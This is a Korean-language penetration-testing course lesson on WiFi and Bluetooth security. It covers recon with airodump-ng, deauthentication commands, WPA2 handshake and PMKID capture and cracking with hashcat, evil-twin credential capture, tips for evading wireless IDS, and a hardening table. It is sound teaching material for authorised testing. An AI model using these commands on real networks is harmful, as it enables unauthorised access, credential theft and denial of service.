# 무선 보안

**이전**: [15. 사후 익스플로잇](./15_Post_Exploitation.md) | **다음**: [17. 클라우드 보안 테스트](./17_Cloud_Security_Testing.md)

---

무선 네트워크(Wireless Network)는 조직의 공격 표면을 물리적 경계 너머로 확장한다. 이 레슨에서는 WiFi 보안 프로토콜, 일반적인 공격 기법, 그리고 인가된 평가에서 무선 보안을 점검하는 데 사용되는 도구를 다룬다.

> **중요**: 소유하지 않은 네트워크에 대한 무선 공격은 불법이다. 자신의 네트워크 또는 명시적인 서면 인가를 받은 네트워크에서만 테스트한다.

**난이도**: ⭐⭐⭐⭐

## 학습 목표

1. WiFi 인증 프로토콜(WPA2-PSK, WPA2-Enterprise, WPA3) 이해
2. airodump-ng를 사용한 WiFi 정찰 수행
3. WPA2 4방향 핸드셰이크(four-way handshake) 캡처 및 크래킹
4. 크리덴셜 캡처를 위한 이블 트윈(Evil Twin) 액세스 포인트 설정
5. 클라이언트 인증 해제 없이 PMKID 공격 실행
6. 블루투스(Bluetooth) 보안 취약점 평가
7. 무선 침입 탐지 시스템 우회
8. 무선 보안 강화 조치 권고

---

## 목차

1. [WiFi 프로토콜 기초](#1-wifi-프로토콜-기초)
2. [WPA2 및 WPA3 보안](#2-wpa2-및-wpa3-보안)
3. [WiFi 정찰](#3-wifi-정찰)
4. [인증 해제 공격](#4-인증-해제-공격)
5. [WPA2 핸드셰이크 캡처 및 크래킹](#5-wpa2-핸드셰이크-캡처-및-크래킹)
6. [이블 트윈 공격](#6-이블-트윈-공격)
7. [PMKID 공격](#7-pmkid-공격)
8. [블루투스 보안](#8-블루투스-보안)
9. [무선 IDS 우회](#9-무선-ids-우회)
10. [무선 보안 강화](#10-무선-보안-강화)
11. [연습 문제](#11-연습-문제)
12. [요약](#12-요약)
13. [참고 자료](#13-참고-자료)

---

## 1. WiFi 프로토콜 기초

### 1.1 802.11 표준

| 표준 | 주파수 | 최대 속도 | 범위 |
|------|--------|-----------|------|
| 802.11b | 2.4 GHz | 11 Mbps | ~35m |
| 802.11g | 2.4 GHz | 54 Mbps | ~35m |
| 802.11n | 2.4/5 GHz | 600 Mbps | ~70m |
| 802.11ac | 5 GHz | 6.9 Gbps | ~35m |
| 802.11ax (WiFi 6) | 2.4/5/6 GHz | 9.6 Gbps | ~35m |

---

## 2. WPA2 및 WPA3 보안

### 2.1 WPA2-PSK 약점

- 사전 공유 키(Pre-shared Key)가 패스프레이즈에서 파생됨 → 오프라인 크래킹 가능
- 4방향 핸드셰이크를 캡처하여 공격 가능
- 첫 번째 핸드셰이크 메시지에서 PMKID 추출 가능

### 2.2 WPA3 개선 사항

- **SAE(Simultaneous Authentication of Equals)**: PSK 교환을 대체
- **전방 비밀성(Forward Secrecy)**: 비밀번호가 유출되어도 과거 트래픽은 노출되지 않음
- **오프라인 사전 공격 저항**: SAE가 오프라인 크래킹을 방지
- **보호된 관리 프레임(Protected Management Frames)**: 필수 (인증 해제 공격 방지)

---

## 3. WiFi 정찰

```bash
# Enable monitor mode
airmon-ng start wlan0

# Scan for networks
airodump-ng wlan0mon

# Target specific network
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Key information:
# BSSID — Access point MAC address
# ESSID — Network name
# CH — Channel
# ENC — Encryption (WPA2, WPA3, OPN)
# CIPHER — Encryption cipher (CCMP, TKIP)
# AUTH — Authentication (PSK, MGT)
```

---

## 4. 인증 해제 공격

인증 해제(Deauthentication) 프레임은 클라이언트를 강제로 연결 해제시켜 재인증하게 한다(핸드셰이크 캡처):

```bash
# Deauth specific client
aireplay-ng --deauth 5 -a <AP_BSSID> -c <Client_MAC> wlan0mon

# Deauth all clients on AP
aireplay-ng --deauth 0 -a <AP_BSSID> wlan0mon
```

> **참고**: 보호된 관리 프레임(PMF)이 적용된 WPA3는 인증 해제 공격을 방지한다.

---

## 5. WPA2 핸드셰이크 캡처 및 크래킹

```bash
# 1. Start capture
airodump-ng -c 6 --bssid <AP_BSSID> -w handshake wlan0mon

# 2. Deauth to force re-authentication
aireplay-ng --deauth 5 -a <AP_BSSID> wlan0mon

# 3. Wait for "WPA handshake: AA:BB:CC:DD:EE:FF" message

# 4. Crack with aircrack-ng
aircrack-ng handshake-01.cap -w /usr/share/wordlists/rockyou.txt

# 5. Or with hashcat (faster with GPU)
# Convert to hccapx format
hcxpcapngtool handshake-01.cap -o hash.hc22000
hashcat -m 22000 hash.hc22000 rockyou.txt
```

---

## 6. 이블 트윈 공격

대상 네트워크를 모방하는 가짜 액세스 포인트를 생성한다:

```bash
# Using hostapd-wpe for WPA2-Enterprise
# Captures RADIUS credentials (username and MSCHAPv2 hash)
hostapd-wpe hostapd-wpe.conf

# Using Fluxion (automated evil twin)
# Creates fake AP, captures WPA password via phishing page
```

---

## 7. PMKID 공격

PMKID 공격은 전체 핸드셰이크 없이 첫 번째 EAPOL 메시지에서 PMKID를 추출한다:

```bash
# Capture PMKID
hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1

# Extract PMKID hash
hcxpcapngtool capture.pcapng -o pmkid_hash.hc22000

# Crack
hashcat -m 22000 pmkid_hash.hc22000 rockyou.txt
```

**장점**: 클라이언트 인증 해제가 필요 없음 — 클라이언트 관점에서 완전히 수동적이다.

---

## 8. 블루투스 보안

### 8.1 블루투스 공격 표면

| 공격 | 설명 | 도구 |
|------|------|------|
| BlueBorne | BT를 통한 원격 코드 실행 | 다양한 CVE 익스플로잇 |
| KNOB | 키 협상 다운그레이드 | 커스텀 도구 |
| BlueSmack | L2CAP을 통한 블루투스 DoS | l2ping |
| BlueSnarfing | 비인가 데이터 접근 | bluesnarfer |
| BLE 스니핑 | BLE 통신 캡처 | Ubertooth, BtleJuice |

```bash
# Bluetooth reconnaissance
hciconfig              # List BT adapters
hcitool scan           # Discover devices
hcitool info <addr>    # Device information
sdptool browse <addr>  # Service discovery
```

---

## 9. 무선 IDS 우회

- **채널 호핑(Channel Hopping)**: 공격 중 빠르게 채널을 전환
- **저전력**: 탐지 범위를 제한하기 위해 송신 전력을 낮춤
- **MAC 스푸핑(MAC Spoofing)**: 어댑터 MAC 주소를 변경
- **타이밍**: 트래픽이 많은 시간대에 공격하여 혼입

---

## 10. 무선 보안 강화

| 조치 | 우선순위 | 설명 |
|------|----------|------|
| WPA3-SAE | 필수 | WPA2-PSK에서 업그레이드 |
| 강력한 패스프레이즈 | 필수 | 20자 이상의 무작위 패스프레이즈 |
| WPA2-Enterprise | 높음 | 인증서 기반 RADIUS 인증 |
| PMF (802.11w) | 높음 | 인증 해제/연결 해제 공격 방지 |
| WPS 비활성화 | 높음 | WPS PIN은 무차별 대입 가능 |
| WIDS/WIPS | 중간 | 불법 AP 및 공격 탐지 |
| MAC 필터링 | 낮음 | 쉽게 우회 가능하지만 마찰 추가 |
| 숨겨진 SSID | 낮음 | 발견을 방지하지 못함 |

---

## 11. 연습 문제

1. **WiFi 정찰**: airodump-ng를 사용하여 랩 내 모든 무선 네트워크를 매핑한다. SSID, 암호화 방식, 채널을 문서화한다.
2. **핸드셰이크 캡처**: 자신의 AP에서 WPA2 핸드셰이크를 캡처하고 워드리스트로 크래킹한다.
3. **PMKID 공격**: 자신의 액세스 포인트에서 PMKID를 추출하고 크래킹한다.
4. **이블 트윈**: 자신의 WPA2-Enterprise 네트워크에 대한 이블 트윈을 설정하고 크리덴셜을 캡처한다.
5. **블루투스 스캔**: 범위 내 모든 블루투스 디바이스를 열거하고 서비스를 식별한다.
6. **보안 강화**: 자신의 가정/랩 무선 구성을 평가하고 권장하는 모든 강화 조치를 구현한다.

---

## 12. 요약

무선 보안은 공격 표면을 물리적 경계 너머로 확장한다:

- **WPA2-PSK** 핸드셰이크는 캡처하여 오프라인에서 크래킹할 수 있다
- **PMKID 공격**은 클라이언트 상호작용 없이 크래킹 가능한 해시를 추출한다
- **이블 트윈** 공격은 가짜 액세스 포인트를 통해 크리덴셜을 캡처한다
- **인증 해제**는 클라이언트를 강제로 재연결시킨다 (WPA3 PMF로 완화)
- **WPA3**는 SAE와 전방 비밀성으로 보안을 크게 향상시킨다
- **블루투스**는 추가적인 무선 공격 표면을 제공한다
- 강력한 패스프레이즈와 WPA2-Enterprise/WPA3가 필수 방어 수단이다

---

## 13. 참고 자료

- Aircrack-ng: https://www.aircrack-ng.org/
- hcxdumptool: https://github.com/ZerBea/hcxdumptool
- WiFi Security Testing Cheat Sheet: https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-wifi
- KRACK Attack: https://www.krackattacks.com/
- Dragonblood (WPA3 attacks): https://wpa3.mathyvanhoef.com/
